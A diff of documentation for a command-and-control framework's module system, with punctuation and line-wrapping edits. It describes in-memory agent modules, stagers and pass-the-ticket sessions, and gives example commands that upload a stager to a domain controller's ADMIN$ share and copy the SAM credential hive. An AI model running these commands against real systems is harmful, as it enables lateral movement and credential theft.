@@ -9,10 +9,10 @@ operator invokes that command the C2 hosts the payload, sends the agent a
 There are two kinds of modules:
 
 - **Agent modules** run on the target. `agent_config.type` is one of:
-  - `coff` — a Windows COFF/BOF or Linux relocatable object,
-  - `starlark` — a script for the embedded Starlark engine,
-  - `dll` — a Windows DLL mapped into the agent process, or
-  - `so` — a Linux shared-library dependency used by other modules.
+  - `coff`: a Windows COFF/BOF or Linux relocatable object,
+  - `starlark`: a script for the embedded Starlark engine,
+  - `dll`: a Windows DLL mapped into the agent process, or
+  - `so`: a Linux shared-library dependency used by other modules.
 
   The payload is never written to disk and no interpreter or child process is
   spawned on the target. DLL/SO modules can also be declared as `dependencies`
@@ -23,7 +23,7 @@ There are two kinds of modules:
   (`loader_windows`, `stager_linux`, `crystal_pack`). They have no
   `agent_config`. Because they never reach an agent, they run without a
   selected target and their `platform` field (when set) is informational
-  only — it describes the OS the produced payload targets, not where the
+  only: it describes the OS the produced payload targets, not where the
   module runs.
 
 The built-in commands (`listener`, `file_downloader`,
@@ -213,7 +213,7 @@ value in the module invocation.
 | Field         | Meaning                                                                                                                                                 |
 | ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | `name`        | Flag name, used as `--name value`.                                                                                                                      |
-| `description` | Help text. **Required** — a parameter without a description makes the whole manifest fail to load.                                                      |
+| `description` | Help text. **Required**: a parameter without a description makes the whole manifest fail to load.                                                       |
 | `default`     | Value used when the operator omits the flag.                                                                                                            |
 | `type`        | Value type and, for BOFs, wire format (see §5). For `starlark` this is informational; scripts receive raw strings.                                      |
 | `required`    | Reject the invocation when the value is empty. Enforced for every module type.                                                                          |
@@ -266,7 +266,7 @@ Notes:
 - Starlark is dynamically typed: its `main(*args)` receives every parameter as
   a positional string, in declaration order, and the script does its own
   `int()`/`bool()` conversion. The C2 only checks `required` for Starlark
-  parameters — `choices`, `min`, `max` and `type` are **not** applied, so a
+  parameters; `choices`, `min`, `max` and `type` are **not** applied, so a
   Starlark module that needs strict input validation must do it itself.
 
 ---
@@ -310,7 +310,7 @@ free of any other runtime dependency.
 On the C2 (`moduleCustom`):
 
 1. If `build` is set, run it in the module directory with the current flags.
-2. If `is_local` is true, stop — the module ran on the C2 with no target
+2. If `is_local` is true, stop: the module ran on the C2 with no target
    required and no platform check (see §1).
 3. Resolve and validate the invocation from the console flags.
 4. Pre-host every `dependencies` payload for the target architecture so a
@@ -319,9 +319,7 @@ On the C2 (`moduleCustom`):
    `!custom_module` job:
 
    ```text
-   !custom_module --mod_name <name> --type <type> \
-     --file_to_download <hosted.gz> --checksum <sha256> \
-     --invocation <base64 CBOR> [--peer <ip>]
+   !custom_module --mod_name <name> --type <type> --file_to_download <hosted.gz> --checksum <sha256> --invocation <base64 CBOR> [--peer <ip>]
    ```
 
    For a multi-file Starlark module (`module_files_memfs`), the companion
@@ -335,12 +333,12 @@ On the agent (`ModuleHandler`):
 3. Cache companion files in memfs and expose their paths as `module_files`.
 4. Resolve `--token` / `--user` / `--ticket` into a token context (Windows).
 5. Dispatch by `--type`:
-   - `starlark` — `script.Run(payload, argv, {module_files}, token)`.
-   - `coff` — run the BOF through the in-memory `coffloader` dependency
+   - `starlark`: `script.Run(payload, argv, {module_files}, token)`.
+   - `coff`: run the BOF through the in-memory `coffloader` dependency
      (Windows) or the native ELF loader (Linux).
-   - `dll` — map the DLL and call its `LoadAndRun` export for the BOF named by
+   - `dll`: map the DLL and call its `LoadAndRun` export for the BOF named by
      `dll_entry`.
-   - `so` — a shared-library dependency (e.g. `libbpf`). It is fetched on
+   - `so`: a shared-library dependency (e.g. `libbpf`). It is fetched on
      demand by the `ebpf_*` builtins; invoking it directly reports that it is a
      dependency.
 
@@ -357,8 +355,8 @@ Windows `coff` modules always depend on `coffloader`; Linux eBPF modules depend
 on `libbpf`.
 
 The C2 only builds and hosts each dependency as `<name>.<arch>.gz`; the agent
-decides when to map it. That decision lives in one place — **`core/lib/memdeps`**
-— so every dependency follows the same rule: **map on use, unmap on return.**
+decides when to map it. That decision lives in one place (`core/lib/memdeps`)
+so every dependency follows the same rule: **map on use, unmap on return.**
 A dependency image is never left resident in cleartext once the operation that
 needed it has finished.
 
@@ -598,8 +596,8 @@ Every function is available both as `agent.foo()` and as a top-level
 
 ### Globals
 
-- `argv` — the resolved argument list (same values passed to `main`).
-- `module_files` — memfs paths of a multi-file module's companion files, in
+- `argv`: the resolved argument list (same values passed to `main`).
+- `module_files`: memfs paths of a multi-file module's companion files, in
   `agent_config.files` order (empty for single-file modules).
 
 ### Entry point
@@ -653,7 +651,7 @@ created and the ticket imported as part of the module invocation.
 ### Netlogon sessions and pass-the-ticket
 
 Kerberos APIs are bound to a logon session in LSASS, not to a token. `--user`
-creates a _netonly_ (new-credentials) session — the same primitive as Cobalt
+creates a _netonly_ (new-credentials) session, the same primitive as Cobalt
 Strike's `make_token` or `runas /netonly`. The password is never validated
 (the agent supplies a dummy value), and the session keeps the caller's local
 identity while lending the supplied credentials to outbound network
@@ -677,10 +675,8 @@ The `cifs` suite moves files directly to machines that run no agent, over
 their `ADMIN$`/`C$` shares:
 
 ```text
-cifs_upload --src memfs:///stage.exe --dest '\\DC01\ADMIN$\Temp\stage.exe' \
-  --token <DA token>
-cifs_download --src '\\DC01\C$\Windows\system32\config\SAM' \
-  --dest memfs:///SAM --user CORP.LOCAL/da --ticket <base64 kirbi>
+cifs_upload --src memfs:///stage.exe --dest '\\DC01\ADMIN$\Temp\stage.exe' --token <DA token>
+cifs_download --src '\\DC01\C$\Windows\system32\config\SAM' --dest memfs:///SAM --user CORP.LOCAL/da --ticket <base64 kirbi>
 cifs_rm --dest '\\DC01\ADMIN$\Temp\stage.exe'
 ```
 
@@ -717,7 +713,7 @@ Pair with the `scshell` BOF to execute an uploaded file on the target.
 | Symptom                                                | Likely cause                                                                                                                               |
 | ------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------ |
 | `missing COFF invocation data`                         | `invocation.coff_export` is not set on a `coff` module.                                                                                    |
-| Module registered but never runs; "does not support …" | `platform` does not match the agent OS and is not `Generic`. Only applies to agent modules — local (`is_local`) modules are exempt.        |
+| Module registered but never runs; "does not support …" | `platform` does not match the agent OS and is not `Generic`. Only applies to agent modules; local (`is_local`) modules are exempt.         |
 | Manifest fails to load                                 | A parameter has no `description`, or a non-local module's `agent_config.type` is missing or not `coff`/`starlark`/`dll`/`so`.              |
 | `option X is required`                                 | The flag was empty and the parameter is `required`.                                                                                        |
 | Linux BOF reports `statically linked`                  | The agent has no libc mapped; Linux BOFs require a dynamically linked Linux agent.                                                          |
